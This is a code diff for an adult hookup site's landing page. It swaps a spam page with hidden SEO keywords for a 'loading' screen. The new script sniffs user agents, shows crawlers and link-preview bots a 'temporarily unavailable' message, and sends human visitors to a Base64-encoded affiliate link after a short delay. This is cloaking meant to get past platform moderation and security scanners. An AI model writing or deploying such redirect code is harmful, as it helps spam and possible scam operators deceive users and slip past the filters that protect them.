@@ -42,120 +42,75 @@
 
   <style>
     body {
-      background-color: #0d0d0d;
-      color: #fff;
-      font-family: 'Inter', sans-serif;
       margin: 0;
-      padding: 30px;
-      line-height: 1.6;
+      font-family: sans-serif;
+      background: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
-
-    h1 {
+    .loading {
       text-align: center;
-      color: #ff4d4d;
-      font-size: 2.4em;
-      text-shadow: 0 0 10px rgba(255, 77, 77, 0.2);
-      margin-bottom: 20px;
     }
-
-    p {
-      text-align: center;
-      font-size: 1.15em;
-      color: #ccc;
-      margin-bottom: 40px;
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #333;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      margin: 20px auto;
+      animation: spin 1s linear infinite;
     }
-
-    .links {
-      display: grid;
-      gap: 20px;
-      max-width: 600px;
-      margin: 0 auto;
-    }
-
-    .link-card {
-      background: linear-gradient(145deg, #1a1a1a, #141414);
-      padding: 20px;
-      border-radius: 12px;
-      text-align: center;
-      border: 1px solid #2a2a2a;
-      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
-      transition: all 0.3s ease;
-    }
-
-    .link-card a {
-      text-decoration: none;
-      color: #ff4d4d;
-      font-weight: 600;
-      font-size: 1.15em;
-      transition: color 0.3s ease, text-shadow 0.3s ease;
-    }
-
-    .link-card:hover {
-      background: #1f1f1f;
-      transform: scale(1.02);
-      box-shadow: 0 0 20px rgba(255, 77, 77, 0.1);
-    }
-
-    .link-card a:hover {
-      color: #ff6666;
-      text-shadow: 0 0 6px rgba(255, 102, 102, 0.4);
-    }
-
-    footer {
-      text-align: center;
-      margin-top: 60px;
-      color: #666;
-      font-size: 0.9em;
-    }
-
-    .ghost-seo {
-      display: none;
-    }
-
-    @media (max-width: 600px) {
-      h1 { font-size: 1.8em; }
-      .link-card a { font-size: 1em; }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
   </style>
 
-  <!-- Google tag (gtag.js) -->
-  <script async src='https://www.googletagmanager.com/gtag/js?id=G-4RK11EWEJE'></script>
+<!-- Tracking -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-4RK11EWEJE"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
     function gtag(){dataLayer.push(arguments);}
     gtag('js', new Date());
     gtag('config', 'G-4RK11EWEJE');
   </script>
+
 </head>
-
 <body>
-  <h1>quickhookup.site – Real People, Real Hookups</h1>
-  <p>No signup. No waiting. Just pure adult fun tonight. Pick your fantasy below and meet someone now.</p>
-
-  <div class="links">
-    <div class="link-card">
-      <a href="go.html">Hook-Up in 5 Minutes – No Signup</a>
-    </div>
-    <div class="link-card">
-      <a href="go.html">No Strings Attached One-Night Stands</a>
-    </div>
-    <div class="link-card">
-      <a href="go.html">Horny Singles Near You Tonight</a>
-    </div>
-    <div class="link-card">
-      <a href="go.html">Local MILFs Craving Hookups</a>
-    </div>
-    <div class="link-card">
-      <a href="go.html">Cheating Wives Looking for Discreet Fun</a>
-    </div>
+  <div id="conteudo" class="loading">
+    <div class="spinner"></div>
+    <p>Loading, please wait...</p>
   </div>
 
-  <div class="ghost-seo">
-    sex tonight, free hookup USA, MILF dating, cheating wife meet, discreet affairs, one night stand site, hookup site for adults, meet horny women online, no signup adult fun
-  </div>
+  <script>
+  (function () {
+    const userAgent = navigator.userAgent.toLowerCase();
 
-  <footer>
-    &copy; 2025 quickhookup.site – Fastest Way to Hook Up Online
-  </footer>
+    const botKeywords = [
+      'bot', 'crawl', 'spider', 'facebook', 'twitter', 'slack',
+      'discord', 'linkedin', 'preview', 'whatsapp', 'telegram',
+      'pinterest', 'reddit', 'nuzzel', 'skype', 'google', 'bitlybot'
+    ];
+
+    // Verifica se é bot
+    for (let i = 0; i < botKeywords.length; i++) {
+      if (userAgent.includes(botKeywords[i])) {
+        document.body.innerHTML = "<h1>Conteúdo temporariamente indisponível.</h1>";
+        return;
+      }
+    }
+
+    // Link de afiliado codificado em Base64
+    const encodedLink = "aHR0cHM6Ly9iZ2ZmZmlnLmh1YmZsb3dzbS5jb20vcy82M2QwMGUyNDBmY2Q1P3N1YnNvdXJjZT1Ib29rVXA=";
+    const destination = atob(encodedLink);
+
+    // Redireciona após 1.5 segundos
+    setTimeout(() => {
+      window.location.href = destination;
+    }, 900);
+  })();
+</script>
 </body>
 </html>
